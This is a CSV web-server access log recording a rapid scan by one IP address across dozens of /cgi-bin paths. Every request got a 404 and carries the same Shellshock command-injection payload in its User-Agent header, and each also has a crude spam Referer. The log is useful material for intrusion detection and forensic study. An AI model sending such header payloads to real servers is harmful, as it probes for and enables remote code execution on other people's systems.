"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"5.196.35.248","-","2015-05-12 03:35:46","GMT-0700","GET","/cgi-bin/php5-cli?",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:46","GMT-0700","GET","/cgi-bin/php-cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:47","GMT-0700","GET","/cgi-bin/php.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:47","GMT-0700","GET","/cgi-bin/php-cgi.bin",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:47","GMT-0700","GET","/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi",404,519,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:48","GMT-0700","GET","/cgi-bin/pollssi.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:48","GMT-0700","GET","/cgi-bin/postcards.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:48","GMT-0700","GET","/cgi-bin/powerup/r.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:49","GMT-0700","GET","/cgi-bin/printenv",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:49","GMT-0700","GET","/cgi-bin/probecontrol.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:49","GMT-0700","GET","/cgi-bin/profile.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:50","GMT-0700","GET","/cgi-bin/publisher/search.cgi",404,512,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:50","GMT-0700","GET","/cgi-bin/quickstore.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:50","GMT-0700","GET","/cgi-bin/quizme.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:51","GMT-0700","GET","/cgi-bin/ratlog.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:51","GMT-0700","GET","/cgi-bin/r.cgi",404,497,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:51","GMT-0700","GET","/cgi-bin/recent.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:52","GMT-0700","GET","/cgi-bin/register.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:52","GMT-0700","GET","/cgi-bin/replicator/webpage.cgi/",404,515,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:52","GMT-0700","GET","/cgi-bin/responder.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:53","GMT-0700","GET","/cgi-bin/robadmin.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:53","GMT-0700","GET","/cgi-bin/robpoll.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:53","GMT-0700","GET","/cgi-bin/sat-ir-web.pl",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:54","GMT-0700","GET","/cgi-bin/sbcgi/sitebuilder.cgi",404,513,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:54","GMT-0700","GET","/cgi-bin/scoadminreg.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:54","GMT-0700","GET","/cgi-bin-sdb/printenv",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:55","GMT-0700","GET","/cgi-bin/search",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:55","GMT-0700","GET","/cgi-bin/search.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:55","GMT-0700","GET","/cgi-bin/search/search.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:56","GMT-0700","GET","/cgi-bin/sendform.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:56","GMT-0700","GET","/cgi-bin/shop.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:56","GMT-0700","GET","/cgi-bin/shopper.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:56","GMT-0700","GET","/cgi-bin/shopplus.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:57","GMT-0700","GET","/cgi-bin/showcheckins.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:57","GMT-0700","GET","/cgi-bin/signon.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:57","GMT-0700","GET","/cgi-bin/simplestguest.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:58","GMT-0700","GET","/cgi-bin/simplestmail.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:58","GMT-0700","GET","/cgi-bin/smartsearch.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:58","GMT-0700","GET","/cgi-bin/smartsearch/smartsearch.cgi",404,519,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:59","GMT-0700","GET","/cgi-bin/snorkerz.bat",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:59","GMT-0700","GET","/cgi-bin/snorkerz.cmd",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:59","GMT-0700","GET","/cgi-bin/sojourn.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:00","GMT-0700","GET","/cgi-bin/spin_client.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:00","GMT-0700","GET","/cgi-bin/start.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:00","GMT-0700","GET","/cgi-bin/status",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:01","GMT-0700","GET","/cgi-bin/status/status.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:01","GMT-0700","GET","/cgi-bin/store/agora.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:01","GMT-0700","GET","/cgi-bin/store.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:02","GMT-0700","GET","/cgi-bin/store/index.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:02","GMT-0700","GET","/cgi-bin/survey.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:02","GMT-0700","GET","/cgi-bin/talkback.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:03","GMT-0700","GET","/cgi-bin/technote/main.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:03","GMT-0700","GET","/cgi-bin/test2.pl",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:03","GMT-0700","GET","/cgi-bin/test-cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:04","GMT-0700","GET","/cgi-bin/test.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:04","GMT-0700","GET","/cgi-bin/test-cgi.pl",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:04","GMT-0700","GET","/cgi-bin/testing_whatever",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:05","GMT-0700","GET","/cgi-bin/test.sh",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:05","GMT-0700","GET","/cgi-bin/test/test.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:05","GMT-0700","GET","/cgi-bin/tidfinder.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:06","GMT-0700","GET","/cgi-bin/tigvote.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:06","GMT-0700","GET","/cgi-bin/title.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:06","GMT-0700","GET","/cgi-bin/tools/tools.pl",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:07","GMT-0700","GET","/cgi-bin/traffic.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:07","GMT-0700","GET","/cgi-bin/tree.php",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:07","GMT-0700","GET","/cgi-bin/troops.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:07","GMT-0700","GET","/cgi-bin/ttawebtop.cgi/",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:08","GMT-0700","GET","/cgi-bin/ultraboard.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:08","GMT-0700","GET","/cgi-bin/upload.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:08","GMT-0700","GET","/cgi-bin/urlcount.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:09","GMT-0700","GET","/cgi-bin/viewcvs.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:09","GMT-0700","GET","/cgi-bin/viralator.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:09","GMT-0700","GET","/cgi-bin/virgil.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:10","GMT-0700","GET","/cgi-bin/vote.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:10","GMT-0700","GET","/cgi-bin/vpasswd.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:10","GMT-0700","GET","/cgi-bin/w3mman2html.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:11","GMT-0700","GET","/cgi-bin/way-board.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:11","GMT-0700","GET","/cgi-bin/way-board/way-board.cgi",404,515,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:11","GMT-0700","GET","/cgi-bin/webbbs.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:12","GMT-0700","GET","/cgi-bin/webcart/webcart.cgi",404,511,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:12","GMT-0700","GET","/cgi-bin/webdist.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:12","GMT-0700","GET","/cgi-bin/webif.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:13","GMT-0700","GET","/cgi-bin/webmail/html/emumail.cgi",404,516,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:13","GMT-0700","GET","/cgi-bin/webmap.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:13","GMT-0700","GET","/cgi-bin/webspirs.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:14","GMT-0700","GET","/cgi-bin/whois.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:14","GMT-0700","GET","/cgi-bin/whois_raw.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:14","GMT-0700","GET","/cgi-bin/whois/whois.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:15","GMT-0700","GET","/cgi-bin/wrap",404,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:15","GMT-0700","GET","/cgi-bin/wrap.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:15","GMT-0700","GET","/cgi-bin/wwwboard.cgi.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:36:16","GMT-0700","GET","/cgi-bin/YaBB/YaBB.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
